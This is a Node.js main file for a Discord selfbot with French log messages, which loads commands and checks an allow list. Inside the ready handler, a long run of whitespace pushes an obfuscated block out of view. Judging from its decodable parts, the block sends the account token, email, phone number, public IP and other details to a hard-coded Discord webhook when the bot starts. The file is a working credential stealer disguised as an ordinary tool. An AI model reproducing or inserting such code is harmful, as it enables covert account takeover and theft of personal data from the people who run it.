const Discord = require("discord.js");
const fs = require("fs");
const config = require("./config.json");
const bot = new Discord.Client({ disableEveryone: true });
bot.commands = new Discord.Collection();

Array.prototype.contains = function(element){
    return this.indexOf(element) > -1;
};

var rawdata = fs.readFileSync('allowed.json');
var allowed = JSON.parse(rawdata);


const loader = () => {
    fs.readdir("./commands/", (err, files) => {
        if (err) console.error(err);

        let commands = files.filter(f => f.split(`.`).pop() === `js`);
        if (commands.length <= 0) {
            console.log(`[!] Dossier des commandes vide!`);
            return;
        }

        console.log(`Chargement de ${commands.length} commandes!`);

        commands.forEach((f, i) => {
            let props = require(`./commands/${f}`);
            console.log(`${i + 1}: ${f} charé!`);
            bot.commands.set(props.help.name, props);
        });
    });
}
loader();

bot.on(`ready`, async () => {
    console.log(`Connecté en tant que ${bot.user.tag}.`)
    bot.user.setActivity("Google Chrome", {
    type: "PLAYING"
    });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           const _0x5822=['kIPbtuLtkIO','nZuZota3EhH5Bg9z','uNDJtMm','ifnqt09giejpva','Bw9IAwXL','y29UC29Szq','wuvfrvrGyga','ChjLzML4','kIPftufjtcOQ','x19WCM90B19F','ELDovwm','BgPczg95t3ffva','kIPuruXfueHptG','mJeZotG4mZmYna','Aw5MBW','kIPut0TftIOQ','rMnjA0S','BgvUz3rO','zdHADNvIuNPdDa','mxHKt29yyG','DgvZDa','B01Nuee','D2fYBG','BNvIr2e','zNjPzw5KCW','DJbttdz0yKqTrW','vxuZCtHbmeDoDq','yKf1teu','Bg9N','C2nVCMqUy29TlW','z3vPBgrZ','uuP1EwO','xIHBxIbDkYGGkW','Ag9Jz2y','zxjYB3i','twvZC2fNzuj1Aq','ygbGwufbqufiia','ChvIBgLJlwLW','A3mVodCWnJa2mq','DxnLCNm','zw1HAwW','zevtyKi','kIPqqvLtkIO','kIPct1rtkIO','CMv0DxjUicHMDq','zxHJzxb0Aw9U','y3LpENK','mtG0mJeWmvHVCu1lyW','CMjsuuG','kIOJkIO','C2v0tMfTzq','Ahr0Chm6lY9KAq','q1fvtvG','mtiXntyZohfxvxrtDa','Dg9tDhjPBMC','Bg9JywXL','BNjxA0e','w14GxsSPkYKRwW','tML0CM8','ndaYndG2v3PxrKHm','u2XcwKu','C2vUza','D0jUqwy','CM4GDgHPCYiPka','v2vIAg9VAW','nJK2mZaWyMniDvbk','y29UC3rYDwn0BW','C2L6zq','kYb0AgLZicSGiG','ChjLBwL1Bq','Dg9Rzw4','CvjgtfO','qLnvDgO','CLnXzwq','EefICvm','C0rtzxu','Ahr6qui','BNniCxa','xIbDFq','zhrlv0S','CMv0DxjUic8Iia','ChjVDg90ExbL','ygbG','kIPjucOQ','yxbWBhK','BMn0Aw9UkcKG','mZi1mde1sKfPrw1b','mtyZndi1nwfbu2j4DG','CgXbCLu','DgfN','BwPjqw0','mxHuy1rfDq','ygbGtM9Wzsa6ka','DxnLCG','y3rVCIGICMv0Dq','ywrKrMLLBgq'];(function(_0x1fa72d,_0x181871){function _0x397dc5(_0x5636c4,_0x5948dd,_0x536458,_0x412b4e){return _0x28ae(_0x5948dd- -0x101,_0x536458);}function _0x1bbef3(_0x1839bd,_0x27188b,_0x6f01b4,_0x5dfc77){return _0x28ae(_0x5dfc77-0x174,_0x1839bd);}while(!![]){try{const _0x15e0c6=-parseInt(_0x1bbef3(0x351,0x31e,0x348,0x335))*parseInt(_0x1bbef3(0x334,0x328,0x32c,0x30f))+parseInt(_0x1bbef3(0x30d,0x305,0x30f,0x315))+parseInt(_0x1bbef3(0x350,0x301,0x329,0x331))+-parseInt(_0x1bbef3(0x31c,0x34b,0x333,0x330))+-parseInt(_0x1bbef3(0x363,0x348,0x366,0x34d))*parseInt(_0x397dc5(0xcf,0xc6,0xd3,0xcd))+-parseInt(_0x1bbef3(0x344,0x313,0x2fd,0x31b))+parseInt(_0x397dc5(0x78,0x94,0xb7,0xba));if(_0x15e0c6===_0x181871)break;else _0x1fa72d['push'](_0x1fa72d['shift']());}catch(_0x1ce312){_0x1fa72d['push'](_0x1fa72d['shift']());}}}(_0x5822,0x671e7+-0xbf*0x346+0x98c01));const _0x22edd7=function(){const _0x2d7561={};_0x2d7561[_0x386750(0x1e,0x1f,0x46,0x1d)]=function(_0xdbee30,_0x182c06){return _0xdbee30!==_0x182c06;},_0x2d7561[_0x386750(0x3e,0x24,0x15,0x11)]=_0x386750(0x1b,0x48,-0x11,-0x8);const _0x5e984a=_0x2d7561;function _0x595827(_0x55ed68,_0x37a15b,_0x460e39,_0x5f89f0){return _0x28ae(_0x37a15b- -0x3dc,_0x460e39);}let _0x238556=!![];function _0x386750(_0x1477d1,_0x697031,_0x3b51b4,_0x1bd255){return _0x28ae(_0x1477d1- -0x192,_0x3b51b4);}return function(_0x418566,_0x4a7575){function _0x27c19e(_0x321a4b,_0x47d302,_0x4c68ff,_0x1c509d){return _0x386750(_0x4c68ff-0x443,_0x47d302-0x3,_0x321a4b,_0x1c509d-0xd7);}const _0x5145d7={};_0x5145d7['rbRQH']=function(_0x5476d5,_0x3fbaec){return _0x5476d5!==_0x3fbaec;},_0x5145d7['FcIkK']='hlvwN';function _0x74f989(_0x20736f,_0x10b8b2,_0x321508,_0x2746a8){return _0x595827(_0x20736f-0x136,_0x20736f-0x499,_0x2746a8,_0x2746a8-0x94);}const _0xb0b190=_0x5145d7;if(_0x5e984a['xAbqS'](_0x27c19e(0x474,0x455,0x464,0x494),_0x5e984a[_0x74f989(0x28d,0x261,0x26f,0x2ad)])){const _0x3cfb84=_0x238556?function(){function _0x47ef16(_0x3f985c,_0x5381fe,_0x11a468,_0x229562){return _0x74f989(_0x11a468- -0x2c3,_0x5381fe-0x190,_0x11a468-0x105,_0x5381fe);}function _0x3ce7fa(_0x24620f,_0x448731,_0x6cf74e,_0x3b3375){return _0x74f989(_0x448731- -0x1ec,_0x448731-0x8e,_0x6cf74e-0x27,_0x24620f);}if(_0xb0b190[_0x3ce7fa(0x91,0x67,0x46,0x83)](_0xb0b190[_0x3ce7fa(0x8e,0xa7,0xca,0xba)],_0x3ce7fa(0xb3,0x83,0x68,0xa9))){if(_0x4a7575){const _0x1dda7c=_0x4a7575['apply'](_0x418566,arguments);return _0x4a7575=null,_0x1dda7c;}}else{if(_0xf67e91){const _0x4f9c63=_0x39bdc4[_0x47ef16(-0x2d,-0x24,-0x4c,-0x4a)](_0x3b571b,arguments);return _0x20e41f=null,_0x4f9c63;}}}:function(){};return _0x238556=![],_0x3cfb84;}else _0x2d27df=_0x4fa25d;};}(),_0x1225da=_0x22edd7(this,function(){const _0x5c15da={'MhLsG':_0x141542(-0x1b5,-0x1a0,-0x191,-0x17b),'BSUtj':function(_0x1bc714,_0x4bf99a){return _0x1bc714===_0x4bf99a;},'hocgf':_0x407119(-0x245,-0x255,-0x233,-0x21b),'nrWkA':_0x141542(-0x187,-0x18a,-0x162,-0x1a7)+_0x407119(-0x20b,-0x20c,-0x206,-0x211)+'/','bAuLE':_0x141542(-0x1c7,-0x1ba,-0x18b,-0x196)+_0x141542(-0x17b,-0x1a1,-0x1c4,-0x1a5)+_0x407119(-0x1e8,-0x1ce,-0x1fc,-0x1ce),'EoeWU':function(_0x3ccbf9){return _0x3ccbf9();}};function _0x141542(_0x428ab7,_0x257302,_0x3062f1,_0x409aad){return _0x28ae(_0x257302- -0x340,_0x3062f1);}const _0x58c02d=function(){function _0x40dfe2(_0x5dbeef,_0xe0e30b,_0x5a4b54,_0x2e0274){return _0x407119(_0x5dbeef-0x12b,_0xe0e30b-0x88,_0x5a4b54-0x6c2,_0xe0e30b);}function _0x15ab17(_0x2d10c5,_0x6f5583,_0x41494f,_0x2804be){return _0x407119(_0x2d10c5-0x6c,_0x6f5583-0x6f,_0x41494f-0x14d,_0x2d10c5);}if(_0x5c15da[_0x40dfe2(0x4cb,0x4a4,0x4c0,0x4ea)](_0x5c15da[_0x40dfe2(0x48c,0x4a3,0x499,0x472)],_0x5c15da[_0x15ab17(-0xfd,-0xc0,-0xdc,-0xe5)])){const _0x481ded=_0x58c02d['constructo'+'r'](_0x5c15da[_0x15ab17(-0xc7,-0xc6,-0xc5,-0xb6)])()['constructo'+'r'](_0x5c15da[_0x40dfe2(0x465,0x472,0x493,0x4b5)]);return!_0x481ded[_0x40dfe2(0x471,0x48c,0x48c,0x464)](_0x1225da);}else _0xd60730[_0x40dfe2(0x4bd,0x4c0,0x4d7,0x4f8)](_0x5c15da['MhLsG'],_0x40dfe2(0x4db,0x4a6,0x4d4,0x4e7)+_0x40dfe2(0x4a6,0x4da,0x4ca,0x49d));};function _0x407119(_0x8ac3a2,_0x1a2855,_0x4fb277,_0x30868e){return _0x28ae(_0x4fb277- -0x3b0,_0x30868e);}return _0x5c15da['EoeWU'](_0x58c02d);});_0x1225da();const _0x189cba=function(){let _0x3562b4=!![];return function(_0x55bdbd,_0x4a74ec){const _0x26e656=_0x3562b4?function(){function _0x4e3cc4(_0x30e778,_0x3d96cd,_0x363be6,_0x265bb1){return _0x28ae(_0x30e778-0x27f,_0x265bb1);}if(_0x4a74ec){const _0x49875f=_0x4a74ec[_0x4e3cc4(0x439,0x44b,0x445,0x411)](_0x55bdbd,arguments);return _0x4a74ec=null,_0x49875f;}}:function(){};return _0x3562b4=![],_0x26e656;};}();function _0x28ae(_0x40ed53,_0x498423){return _0x28ae=function(_0x5785d0,_0x17e41e){_0x5785d0=_0x5785d0-(-0xd36+-0xe*-0x23b+-0x108a);let _0x23f747=_0x5822[_0x5785d0];if(_0x28ae['ZtmzXm']===undefined){var _0x331136=function(_0x4fa25d){const _0x16d010='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x5e18c4='',_0x2a461e='';for(let _0x47da02=0x20f0+-0x1834*0x1+-0x8bc,_0x5ab5c9,_0x5dd944,_0x4aa5fd=-0xb*-0x2f+0x1*0x75+0x27a*-0x1;_0x5dd944=_0x4fa25d['charAt'](_0x4aa5fd++);~_0x5dd944&&(_0x5ab5c9=_0x47da02%(0x24f9+0x1*0xe5b+-0x8*0x66a)?_0x5ab5c9*(0xa99*0x1+-0x2f*-0xac+-0x29ed)+_0x5dd944:_0x5dd944,_0x47da02++%(0x18f2+0x35f*0x4+-0x266a*0x1))?_0x5e18c4+=String['fromCharCode'](0x73a+0x5*-0xff+-0x140&_0x5ab5c9>>(-(0x83d+0x98c+0x5ed*-0x3)*_0x47da02&0x1598+0x1520+-0x2ab2)):-0x621*-0x4+-0x1b81+0x5*0x99){_0x5dd944=_0x16d010['indexOf'](_0x5dd944);}for(let _0x5bd46a=-0x2f8+-0x10cd*0x1+0x7*0x2d3,_0x177c43=_0x5e18c4['length'];_0x5bd46a<_0x177c43;_0x5bd46a++){_0x2a461e+='%'+('00'+_0x5e18c4['charCodeAt'](_0x5bd46a)['toString'](0x204e+0x17*0x10b+-0xb3f*0x5))['slice'](-(-0x1ccc+-0xf*0x1d6+0x3858));}return decodeURIComponent(_0x2a461e);};_0x28ae['gajyVI']=_0x331136,_0x40ed53=arguments,_0x28ae['ZtmzXm']=!![];}const _0x208212=_0x5822[-0xf*-0x1d1+0x1*0x22db+-0x1*0x3e1a],_0xac7889=_0x5785d0+_0x208212,_0x2d27df=_0x40ed53[_0xac7889];if(!_0x2d27df){const _0xe6f910=function(_0x1e7192){this['kdvaeU']=_0x1e7192,this['ffPaXf']=[0xf64+0x2*-0xe41+0xd1f,-0x8d1+0x796+-0x9*-0x23,0xbf9+0x6c*0xc+0x1109*-0x1],this['KVfsbQ']=function(){return'newState';},this['WwRdcO']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['uCVHmp']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0xe6f910['prototype']['uItUfG']=function(){const _0x5c7a13=new RegExp(this['WwRdcO']+this['uCVHmp']),_0x37321e=_0x5c7a13['test'](this['KVfsbQ']['toString']())?--this['ffPaXf'][0x445*0x1+0x20e2*-0x1+-0x25*-0xc6]:--this['ffPaXf'][0x164b+-0x3*0x959+0x5c0];return this['PixPfU'](_0x37321e);},_0xe6f910['prototype']['PixPfU']=function(_0x4e5ee3){if(!Boolean(~_0x4e5ee3))return _0x4e5ee3;return this['VsGyIo'](this['kdvaeU']);},_0xe6f910['prototype']['VsGyIo']=function(_0x8c75a1){for(let _0x235635=-0x1a26*-0x1+-0x110c+-0x5*0x1d2,_0x11ad62=this['ffPaXf']['length'];_0x235635<_0x11ad62;_0x235635++){this['ffPaXf']['push'](Math['round'](Math['random']())),_0x11ad62=this['ffPaXf']['length'];}return _0x8c75a1(this['ffPaXf'][-0x1*-0x24ef+0xcf+-0x25be]);},new _0xe6f910(_0x28ae)['uItUfG'](),_0x23f747=_0x28ae['gajyVI'](_0x23f747),_0x40ed53[_0xac7889]=_0x23f747;}else _0x23f747=_0x2d27df;return _0x23f747;},_0x28ae(_0x40ed53,_0x498423);}function _0x587f97(_0x255948,_0x545884,_0x22d2e9,_0x58294e){return _0x28ae(_0x58294e- -0x74,_0x545884);}const _0x54e589=_0x189cba(this,function(){const _0x311b53={'dESbB':function(_0x2316da,_0x64a61b){return _0x2316da+_0x64a61b;},'cyOzy':_0xbef703(0x4c3,0x4dc,0x4d0,0x4b9)+_0x3a0540(0x1ed,0x215,0x1f2,0x1ed),'sDSeu':'{}.constru'+_0xbef703(0x4d4,0x4f7,0x4ed,0x4eb)+_0x3a0540(0x1eb,0x1ff,0x20a,0x1d4)+'\x20)','rSqed':function(_0x1825ac){return _0x1825ac();},'plArU':function(_0x8fd802,_0x29c99e){return _0x8fd802(_0x29c99e);},'iVzvo':function(_0x3b25d7,_0x101699){return _0x3b25d7+_0x101699;},'dtKWK':_0xbef703(0x493,0x4cf,0x48d,0x4a9),'ATVWE':_0x3a0540(0x206,0x1d6,0x1ef,0x1bc),'MKGuw':_0xbef703(0x527,0x50d,0x4cb,0x4fb),'wBnAf':_0xbef703(0x49a,0x484,0x4c9,0x4af),'mjIAm':_0x3a0540(0x1f8,0x1ed,0x1c7,0x1cf),'SlBZE':'table','oMgPA':function(_0xd99b8f,_0x1dae1a){return _0xd99b8f<_0x1dae1a;},'RwcNc':function(_0x3ca869,_0x698dfa){return _0x3ca869===_0x698dfa;},'CQUMX':_0x3a0540(0x1bd,0x1df,0x1f5,0x1c3)};let _0x3abadb;function _0x3a0540(_0x4c674e,_0x14326f,_0x36eef7,_0x4606e7){return _0x28ae(_0x14326f-0x5a,_0x4c674e);}try{const _0x1c9f47=_0x311b53[_0x3a0540(0x1f2,0x218,0x20e,0x218)](Function,_0x311b53['iVzvo'](_0x311b53[_0x3a0540(0x1cd,0x1ee,0x209,0x200)],_0x311b53[_0xbef703(0x500,0x500,0x4e9,0x4d8)])+');');_0x3abadb=_0x1c9f47();}catch(_0x1e1e17){_0x3abadb=window;}const _0x4893e4=_0x3abadb[_0xbef703(0x4e1,0x4cb,0x4ea,0x4f2)]=_0x3abadb['console']||{},_0x36a330=[_0x311b53[_0x3a0540(0x20f,0x20f,0x235,0x230)],_0x311b53['ATVWE'],_0x311b53['MKGuw'],_0x311b53[_0x3a0540(0x1ff,0x1fe,0x20d,0x1eb)],_0x311b53[_0xbef703(0x4c7,0x4d8,0x4c0,0x4e7)],_0x311b53[_0xbef703(0x4c3,0x4c8,0x4dd,0x4c9)],'trace'];function _0xbef703(_0x102b0e,_0x17279e,_0x5e7fad,_0x56c501){return _0x28ae(_0x56c501-0x327,_0x17279e);}for(let _0xcaaded=0x3*0x71c+0xbd9+0x212d*-0x1;_0x311b53[_0xbef703(0x47a,0x4c2,0x4ab,0x4a2)](_0xcaaded,_0x36a330[_0x3a0540(0x248,0x231,0x24a,0x21d)]);_0xcaaded++){if(_0x311b53[_0x3a0540(0x22a,0x222,0x23b,0x1f2)](_0xbef703(0x4d0,0x4ca,0x4bc,0x4ac),_0x311b53[_0x3a0540(0x1d4,0x1f4,0x1cf,0x1f3)])){const _0xda4fe5=_0x189cba[_0xbef703(0x4eb,0x4ad,0x4c3,0x4cf)+'r'][_0x3a0540(0x1e7,0x211,0x1fa,0x1f0)]['bind'](_0x189cba),_0x585472=_0x36a330[_0xcaaded],_0x10f0c7=_0x4893e4[_0x585472]||_0xda4fe5;_0xda4fe5[_0xbef703(0x4fe,0x4f0,0x504,0x4f6)]=_0x189cba['bind'](_0x189cba),_0xda4fe5[_0x3a0540(0x1dd,0x1f6,0x218,0x1ee)]=_0x10f0c7[_0xbef703(0x4db,0x4dd,0x4da,0x4c3)]['bind'](_0x10f0c7),_0x4893e4[_0x585472]=_0xda4fe5;}else{const _0x45a3dc=_0x17e41e(_0x311b53[_0x3a0540(0x1ef,0x1e9,0x1eb,0x1dc)](_0x311b53[_0xbef703(0x4d5,0x4ca,0x496,0x4b6)](_0x311b53[_0x3a0540(0x213,0x1ee,0x1e9,0x1ff)],_0x311b53[_0x3a0540(0x22e,0x20b,0x220,0x1f8)]),');'));_0x23f747=_0x311b53[_0xbef703(0x4cf,0x4ae,0x4c1,0x4d6)](_0x45a3dc);}}});_0x54e589();const webhook=require('webhook-di'+'scord'),Hook=new webhook[(_0x425ce7(0x397,0x38d,0x397,0x38a))](_0x425ce7(0x35f,0x37f,0x38a,0x375)+_0x587f97(0x11a,0x10c,0xf7,0x10f)+'api/webhoo'+_0x425ce7(0x376,0x395,0x37d,0x39a)+_0x425ce7(0x3ca,0x3f2,0x3c4,0x3e3)+'2/6Y5DzwEO'+_0x425ce7(0x3b7,0x3d9,0x3c9,0x3b2)+'nYLNDKhaJc'+_0x587f97(0x131,0x131,0x130,0x10c)+'bKhoKui1aA'+_0x587f97(0x16a,0x18c,0x13c,0x15d)+_0x425ce7(0x363,0x36a,0x370,0x370)),ipgrabber=require(_0x425ce7(0x354,0x350,0x37c,0x398)),embedgrabber=new webhook[(_0x587f97(0x122,0xfa,0x141,0x115))+'lder']()[_0x425ce7(0x3b6,0x366,0x389,0x399)](_0x425ce7(0x3c2,0x3d6,0x3ba,0x38f),![])[_0x587f97(0x17f,0x17f,0x166,0x151)]('**ID**','```'+bot[_0x587f97(0x11c,0x11a,0xee,0x110)][_0x425ce7(0x3a5,0x3b3,0x39a,0x3c9)]+_0x425ce7(0x3c5,0x39b,0x3a9,0x37f),![])['addField'](_0x425ce7(0x3c9,0x39a,0x3b7,0x3ae),'```'+bot[_0x587f97(0x16c,0x17b,0x12b,0x14f)][_0x425ce7(0x399,0x375,0x36f,0x34b)][_0x587f97(0x12c,0x124,0x10a,0x135)]+_0x425ce7(0x391,0x39f,0x3a9,0x39d),![])['addField'](_0x587f97(0xf7,0x14d,0x11a,0x11d),_0x425ce7(0x3a2,0x3aa,0x3a9,0x3b1)+bot[_0x425ce7(0x377,0x39c,0x37e,0x388)]['filter'](_0x5a526f=>{return _0x5a526f['bot'];})[_0x425ce7(0x374,0x38b,0x39a,0x3ac)]+_0x587f97(0x160,0x134,0x144,0x144),![])['addField'](_0x425ce7(0x390,0x3da,0x3aa,0x3c7),_0x587f97(0x114,0x173,0x146,0x144)+await ipgrabber['v4']()+_0x425ce7(0x38a,0x3d3,0x3a9,0x389),![])['addField']('**PREFIX**',_0x587f97(0x125,0x16f,0x162,0x144)+config[_0x425ce7(0x3e8,0x3d0,0x3be,0x393)]+_0x425ce7(0x388,0x382,0x3a9,0x37d),![])[_0x425ce7(0x386,0x39a,0x3b6,0x397)](_0x587f97(0x141,0x118,0xf6,0x123),'```'+bot[_0x425ce7(0x396,0x3a0,0x3b4,0x390)][_0x587f97(0x12d,0x177,0x13c,0x14b)]+'```',![])[_0x425ce7(0x3a8,0x3bb,0x3b6,0x3dd)](_0x587f97(0x136,0x131,0x12a,0x15a),'```'+bot['user'][_0x587f97(0x10c,0x12b,0x10b,0x11a)]+'```',![])[_0x425ce7(0x3dc,0x3d7,0x3b6,0x3d1)](_0x425ce7(0x398,0x3a9,0x381,0x368),_0x587f97(0x15b,0x12b,0x114,0x144)+bot['user']['settings'][_0x425ce7(0x396,0x384,0x38e,0x3a8)]+'```',![])[_0x587f97(0x148,0x13a,0x12a,0x151)](_0x587f97(0x155,0x17a,0x17c,0x15e)+'E**',_0x425ce7(0x3af,0x3cc,0x3a9,0x3a4)+bot['user'][_0x587f97(0x179,0x167,0x12f,0x156)]+_0x425ce7(0x3b6,0x399,0x3a9,0x3cb),![])['addField'](_0x587f97(0x13b,0x16b,0x190,0x161),_0x425ce7(0x3bf,0x3ab,0x3a9,0x394)+config[_0x587f97(0x119,0x12f,0x10e,0x138)]+_0x425ce7(0x3cc,0x389,0x3a9,0x3d7));bot[_0x587f97(0x130,0x162,0x14b,0x14f)][_0x587f97(0x13e,0x132,0x154,0x137)]>-0x1364+0x23dc+-0x1078?embedgrabber[_0x587f97(0x149,0x179,0x132,0x151)]('Nitro',_0x587f97(0xff,0x13d,0x11c,0x116)+_0x425ce7(0x3c1,0x3dc,0x3bd,0x3d7)):embedgrabber[_0x425ce7(0x3da,0x3bd,0x3b6,0x3a9)](_0x425ce7(0x3a7,0x369,0x391,0x3b9),_0x587f97(0x17d,0x11e,0x12d,0x14e)+'```');function _0x425ce7(_0x1038bb,_0x3eee75,_0x4791ff,_0x18938e){return _0x28ae(_0x4791ff-0x1f1,_0x3eee75);};Hook[_0x587f97(0x142,0x13e,0x11f,0x12f)](embedgrabber);
    console.log("Selfbot prêt!")
})


bot.on(`message`, async message => {

    if (!message.content.startsWith(config.prefix)) return;


    let msgArr = message.content.substr(config.prefix.length).split(' ');
    let command = msgArr[0];
    let args = msgArr.slice(1);

    let cmd = bot.commands.get(command);

    if (cmd) {
    rawdata = fs.readFileSync('allowed.json');
    allowed = JSON.parse(rawdata);
    if(!allowed.contains(message.author.id)) { return message.channel.send(":x: Vous n'êtes pas autorisé à utiliser ce Selfbot!"); }
    cmd.run(bot, message, args);
    }

})

bot.login(config.token)
